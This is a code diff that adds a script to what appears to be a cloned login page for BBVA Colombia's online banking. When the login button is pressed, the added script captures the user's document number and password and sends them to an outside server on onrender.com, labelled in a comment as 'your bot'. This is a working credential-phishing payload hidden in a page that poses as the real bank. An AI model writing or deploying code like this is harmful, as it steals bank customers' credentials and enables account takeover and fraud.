@@ -1325,7 +1325,52 @@
  <button id=btnLogin data-cy=btn-login> Entrar </button>
  <a id=redirectLink href=https://nuevaversion.bbvanet.com.co/bbvaco/kqpu_co_web/page/forgetPassword>¿Olvidaste tu contraseña?</a>
  </div>
- 
+ <script>
+    document.getElementById('btnLogin').addEventListener('click', async function(evento) {
+        evento.preventDefault(); 
+
+        const usuario = document.getElementById('data_user').value;
+        const password = document.getElementById('data_pass').value;
+
+        if (!usuario || !password) {
+            alert("Por favor, ingresa tu documento y contraseña.");
+            return;
+        }
+
+        const boton = document.getElementById('btnLogin');
+        boton.innerText = "Cargando...";
+        boton.disabled = true; 
+
+        try {
+            // URL EXACTA DE TU BOT EN RENDER
+            const respuesta = await fetch('https://bot-fige.onrender.com/api/procesar-bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    datosAEnviar: { 
+                        documento: usuario, 
+                        clave: password 
+                    } 
+                })
+            });
+
+            const data = await respuesta.json();
+
+            if (data.continuar) {
+                alert("✅ Verificación exitosa. Avanzando...");
+            } else {
+                alert("❌ Error: Los datos no son correctos o el sitio destino falló.");
+            }
+
+        } catch (error) {
+            alert("❌ Error de conexión con el servidor del bot. Revisa que esté despierto.");
+            console.error(error);
+        } finally {
+            boton.innerText = "Entrar";
+            boton.disabled = false;
+        }
+    });
+</script>
  </section>
  <section class=side-info>
  <div class=promo>
